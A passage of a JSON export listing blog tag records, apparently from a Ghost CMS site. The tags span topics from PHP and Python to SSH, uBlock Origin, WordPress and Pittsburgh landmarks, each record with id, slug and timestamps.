7","slug":"php-7","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f4","name":"php sucks","slug":"php-sucks","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f5","name":"php-fpm","slug":"php-fpm","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f6","name":"pink","slug":"pink","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f7","name":"Pittsburgh","slug":"pittsburgh","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f8","name":"plugins","slug":"plugins","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326f9","name":"privacy","slug":"privacy","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326fa","name":"Privacy Badger","slug":"privacy-badger","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326fb","name":"private key","slug":"private-key","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326fc","name":"problem-solving","slug":"problem-solving","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326fd","name":"problems","slug":"problems","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326fe","name":"professional","slug":"professional","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea05576233300013326ff","name":"programming","slug":"programming","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332700","name":"programming by voice","slug":"programming-by-voice","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332701","name":"proprietary","slug":"proprietary","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332702","name":"public key","slug":"public-key","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332703","name":"python","slug":"python","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332704","name":"python devs are brilliant","slug":"python-devs-are-brilliant","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332705","name":"python is the best ever","slug":"python-is-the-best-ever","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332706","name":"python3.6","slug":"python3-6","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332707","name":"qualcomm","slug":"qualcomm","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332708","name":"quick scripts","slug":"quick-scripts","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332709","name":"quick tip","slug":"quick-tip","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270a","name":"rant","slug":"rant","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270b","name":"raspberry pi","slug":"raspberry-pi","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270c","name":"react","slug":"react","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270d","name":"react.js","slug":"react-js","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270e","name":"ReactJS","slug":"reactjs","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133270f","name":"real estate","slug":"real-estate","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332710","name":"remote","slug":"remote","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332711","name":"responesive","slug":"responesive","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332712","name":"responsiveness","slug":"responsiveness","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332713","name":"safari","slug":"safari","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332714","name":"Satellite","slug":"satellite","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332715","name":"scad","slug":"scad","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332716","name":"scenery","slug":"scenery","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332717","name":"Schenley Park","slug":"schenley-park","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332718","name":"script","slug":"script","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332719","name":"search engine","slug":"search-engine","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271a","name":"search results","slug":"search-results","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271b","name":"secure","slug":"secure","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271c","name":"security","slug":"security","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271d","name":"server","slug":"server","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271e","name":"servers","slug":"servers","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133271f","name":"services","slug":"services","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332720","name":"serving","slug":"serving","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332721","name":"setup","slug":"setup-tag","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332722","name":"sexy boy","slug":"sexy-boy","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332723","name":"shadow","slug":"shadow","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332724","name":"shamu","slug":"shamu","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332725","name":"shell","slug":"shell","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332726","name":"slicer","slug":"slicer","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332727","name":"software","slug":"software","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332728","name":"source","slug":"source","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332729","name":"spool","slug":"spool","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272a","name":"ssh","slug":"ssh","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272b","name":"ssh -X","slug":"ssh-x","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272c","name":"SSL","slug":"ssl","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272d","name":"statue","slug":"statue","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272e","name":"storage","slug":"storage","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133272f","name":"strict typing","slug":"strict-typing","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332730","name":"strings","slug":"strings","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332731","name":"Strip District","slug":"strip-district","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332732","name":"structure","slug":"structure","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332733","name":"sunset","slug":"sunset","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332734","name":"system","slug":"system","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332735","name":"systemd","slug":"systemd","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332736","name":"systemd-boot","slug":"systemd-boot","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332737","name":"terminal","slug":"terminal","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332738","name":"terms of service","slug":"terms-of-service","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332739","name":"theory","slug":"theory","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273a","name":"tip","slug":"tip","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273b","name":"TOS","slug":"tos","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273c","name":"TOS abuse","slug":"tos-abuse","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273d","name":"tr","slug":"tr","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273e","name":"tracking","slug":"tracking","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133273f","name":"transpose","slug":"transpose","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332740","name":"tripod","slug":"tripod","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332741","name":"tripod wedge","slug":"tripod-wedge","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332742","name":"tweaks","slug":"tweaks","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332743","name":"type hints","slug":"type-hints","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332744","name":"typing","slug":"typing","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332745","name":"uBlock","slug":"ublock","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332746","name":"uBlock Origin","slug":"ublock-origin","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332747","name":"ublock origin firefox","slug":"ublock-origin-firefox","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332748","name":"uBlock Origin Firefox Plugin","slug":"ublock-origin-firefox-plugin","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332749","name":"ubuntu","slug":"ubuntu","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274a","name":"ubuntu 17.10","slug":"ubuntu-17-10","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274b","name":"ubuntu server","slug":"ubuntu-server","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274c","name":"Unity","slug":"unity","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274d","name":"updating","slug":"updating","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274e","name":"upgrading","slug":"upgrading","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133274f","name":"vandergrift","slug":"vandergrift","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332750","name":"virtualbox guest additions","slug":"virtualbox-guest-additions","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332751","name":"voice","slug":"voice","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332752","name":"voice recognition","slug":"voice-recognition","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332753","name":"VPS","slug":"vps","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332754","name":"walkthrough","slug":"walkthrough","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332755","name":"weather","slug":"weather","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332756","name":"web","slug":"web","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332757","name":"web browser","slug":"web-browser","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332758","name":"web services","slug":"web-services","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332759","name":"window manager","slug":"window-manager","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275a","name":"windows","slug":"windows","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275b","name":"wordpress","slug":"wordpress","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275c","name":"wordpress backup","slug":"wordpress-backup","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275d","name":"wordpress.com","slug":"wordpress-com","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275e","name":"wordpress.org","slug":"wordpress-org","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea055762333000133275f","name":"work","slug":"work","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332760","name":"workstation","slug":"workstation","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0